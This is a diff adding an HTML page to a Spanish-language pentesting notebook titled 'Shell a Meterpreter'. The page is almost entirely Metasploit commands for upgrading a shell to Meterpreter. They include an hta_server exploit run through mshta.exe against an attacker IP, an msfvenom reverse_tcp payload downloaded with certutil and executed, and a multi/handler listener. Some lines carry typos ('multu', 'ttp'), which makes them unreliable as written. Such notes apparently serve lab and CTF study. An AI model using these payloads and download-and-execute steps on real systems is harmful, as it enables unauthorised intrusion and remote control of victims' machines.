@@ -1,0 +1,88 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Shell a Meterpreter | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="shell-a-meterpreter">
+          <div class="note-tabbar">
+            <span>Shell a Meterpreter</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Shells</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">shells</p>
+            <h2>Shell a Meterpreter</h2>
+
+            <h3>Linux Shell to Meterpreter</h3>
+            <section class="code-card">
+              <h3>Metasploit: sessions</h3>
+              <pre><code>sessions -u &lt;id_sesion&gt;</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Metasploit: módulo</h3>
+              <pre><code>use post/multu/manage/shell_to_meterpreter</code></pre>
+            </section>
+            <h3>Windows Shell to Meterpreter</h3>
+            <section class="code-card">
+              <h3>Metasploit: Servidor HTA malicioso</h3>
+              <pre><code>msfconsole -q
+use exploit/windows/misc/hta_server
+exploit</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Ejecutar el enlace del servidor hta malicioso en el servidor de destino para obtener el shell</h3>
+              <pre><code>mshta.exe ttp://&lt;ip_kali&gt;:8080/13FvvFCiaI4L.hta</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Payload msfvenom</h3>
+              <pre><code># Creamos con msfvenom un payload para windows y levantamos un servidor en python
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST= LPORT= -f exe -o rev.exe
+
+# Desde la cmd obtenida lo descargamos con curl o con:
+certutil -urlcache -f http://ip/rev.exe rev.exe
+
+# Desde metasploit nos ponemos en escucha 
+use multi/handler
+set payload windows/meterpreter/reverse_tcp 
+
+# y a la vez ejecutamos el ejecutable
+.\rev.exe</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Metasploit: módulo</h3>
+              <pre><code>use post/multu/manage/shell_to_meterpreter</code></pre>
+            </section>
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>shells</span>
+              <span>shell_a_meterpreter</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
